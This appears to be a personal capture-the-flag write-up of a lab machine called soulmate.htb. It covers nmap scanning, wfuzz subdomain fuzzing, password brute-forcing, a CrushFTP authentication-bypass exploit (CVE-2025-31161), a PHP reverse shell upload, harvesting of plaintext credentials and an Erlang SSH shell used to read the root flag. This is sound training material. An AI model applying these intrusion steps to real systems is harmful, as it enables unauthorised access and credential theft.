Quick port scanning.
```bash
nmap -p- --min-rate=5000 10.10.11.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 08:23 EDT
Nmap scan report for 10.10.11.86
Host is up (0.072s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4369/tcp open  epmd

Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
                                                                             
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80,4369 -sC -sV 10.10.11.86
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 08:24 EDT
Nmap scan report for 10.10.11.86
Host is up (0.080s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    ssh_runner: 45283
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.02 seconds

```
OK so we have ssh a website and a epmd. I had no idea what epmd is but when i reseached it it apparenly had some vulnerabilities.


https://medium.verylazytech.com/how-to-exploit-erlang-port-mapper-daemon-port-4369-c927ccbe882c

I visited the website and its pretty much a dating website. I'm going to enumerate it with gobuster

I didn't find any interesting directories. So i decided to make an account. There is a way top upload pictures. I wonder if we can use it to get a reverse shell of some sort.


I uploaded a test image and its put into the following path
```bash
http://soulmate.htb/assets/images/profiles/5_1757334916.jpg
```
Max file size: 5MB. Formats: JPG, PNG, GIF


I didn't get it working so i decided to enumerate further.

```bash
 wfuzz -H "HOST: FUZZ.soulmate.htb" -u soulmate.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -b "PHPSESSID=iusutd6u65pt877mhed7vhprdc" --follow
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soulmate.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                 
=====================================================================

000000014:   200        90 L     1325 W     21438 Ch    "ftp - ftp"`
```

lets add ftp.soulmate.htb to the etc/hosts

It brings us to a login screen. I tried to make my username admin before and it said that its taken. So we can try to enumarete it. Especially since it gives us a different error message when trying to log in via admin.

I tried bruteforcing it but didn't get any hits.
```bash

(kali㉿kali)-[~]
└─$ ffuf -u http://ftp.soulmate.htb/WebInterface/function/ \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "command=login&username=admin&password=FUZZ&encoded=true&language=en&random=0.1234" \
    -w /usr/share/wordlists/rockyou.txt \
    -fs 187

```

```bash
searchsploit crushftp -w
------------------------------------------------------------ --------------------------------------------
 Exploit Title                                              |  URL
------------------------------------------------------------ --------------------------------------------
CrushFTP 11.3.1 - Authentication Bypass                     | https://www.exploit-db.com/exploits/52295
CrushFTP 7.2.0 - Multiple Vulnerabilities                   | https://www.exploit-db.com/exploits/36126
CrushFTP < 11.1.0 - Directory Traversal                     | https://www.exploit-db.com/exploits/52012
---------------------------
```
There were multiple recent cve's so we'll try them.
```bash
┌──(kali㉿kali)-[~/soulamtehtb/CVE-2025-31161/CVE-2025-31161]
└─$ python cve-2025-31161.py --target_host ftp.soulmate.htb/ --port 80 --target_user root --new_user hyh --password admin123             
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: test
   [*] Password: admin123.
```

I tried the exploit 52295 and it allowed us to create a new account with admin permissions as long as we had a known crushftp user which was easy. 


Since we are admins we can go to the user manager tab and see the files of pretty much everyone. I can put a php reserve shell into the server files and then execute it and get access.

I was unable to get a shell but since i was able to see everyone directories etc i also found their passwords. Well I wasnt able to do anything with them since they were encrypted but i was just able to generate a new one
Username : ben Password : password

I uploaded a shell and setup a listener and visited
```bash
http://soulmate.htb/phpshell.php
```

```bash
 15:04:17 up  1:22,  1 user,  load average: 0.46, 0.23, 0.23
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ben      pts/2    10.10.14.73      14:45   14:01   0.08s  0.08s /bin/bash -l
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@soulmate:/$ id  
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Imported linpeas.sh over to automate the scan.

```bash
www-data@soulmate:/tmp$ cat /usr/local/lib/erlang_login/start.escript
cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
www-data@soulmate:/tmp$ 
```

There we have the ssh login for ben

ben:HouseH0ldings998

Now we just have to find a way to escalate our priviledges.


```bash
╔══════════╣ Searching passwords in config PHP files
/var/www/soulmate.htb/config/config.php:            $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
```
I found credentials but not sure if they are for anything useful.


I could easily get a root shell from this
```bash
-rwsr-xr-x 1 root root 1.4M Mar 14  2024 /usr/bin/bash
``` 
But i feel like that's not the intended path.

There were multiple ports open so i decided to check them all

```bash
══╣ Active Ports (netstat)                                                                                          
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37977         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:37857         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:4369                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```


I tried the all and nc 127.0.0.1:2222 gave a response that there is ssh running. I tried the previous credentials but nothing happened and then i decided to try just no credentials at all and we were able to "log in"

```bash
bash-5.1$ ssh 127.0.0.1 -p 2222
ben@127.0.0.1's password: 
Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
```


Ok so the commands are erland shell and are quite weird. Im able to access the root folder but idk how to read the files. I have to do some research.


https://riptutorial.com/erlang/example/18563/reading-from-a-file

(ssh_runner@soulmate)33> file:read_file("root.txt")
                         .
{ok,<<"4b32c54f929142305845a2a5df1fd2cd\n">>}

Well that was quite annoying. I hope i don't have to use the Erlang shell ever again
